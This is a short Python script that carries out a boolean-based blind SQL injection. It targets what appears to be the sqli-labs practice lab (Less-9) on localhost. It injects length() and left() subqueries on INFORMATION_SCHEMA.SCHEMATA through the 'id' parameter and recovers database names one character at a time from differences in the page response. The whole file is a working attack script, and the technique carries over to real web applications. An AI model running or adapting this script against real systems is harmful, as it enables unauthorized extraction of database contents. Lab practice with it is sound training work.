import requests
import string
import sys
def get_length(url, comment):
    for i in range(20,4,-1):
        r = requests.get(url + str(i) + comment).text
        # print(url + str(i) + comment)
        if '#0000ff' not in r:
            return i

def send(url):
    r = requests.get(url).text
    if '#0000ff' not in r:
        return True
    else:
        return False

alphabet = string.ascii_lowercase + '_'
url = "http://localhost/Less-9/?id=1' and "
#payload = "left((select database()),"
payload_length_1 = "length((select schema_name FROM INFORMATION_SCHEMA.SCHEMATA limit " 
payload_length_2 = ",1))="
payload1 = "left((select schema_name FROM INFORMATION_SCHEMA.SCHEMATA limit " 
payload2 = ",1)," 
payload3 = ")='"
comment = '--+' 
count = 1
result = ""
dbs = []
for i in range(0,5):
    length = get_length(url + payload_length_1 + str(i) + payload_length_2,comment)
    for j in range(length):
        for c in alphabet:
            final_url = url + payload1 + str(i) + payload2 + str(count) + payload3 + (result+c) + "'" + comment
            # print(final_url)
            if send(final_url):
                count += 1
                result += c
                # print(result)
                sys.stdout.write(c)
                sys.stdout.flush()
    sys.stdout.write("\r\n")
    sys.stdout.flush()
    dbs.append(result)
    result = ""
    count = 1
print("[+] Found: List database: {}".format(dbs))
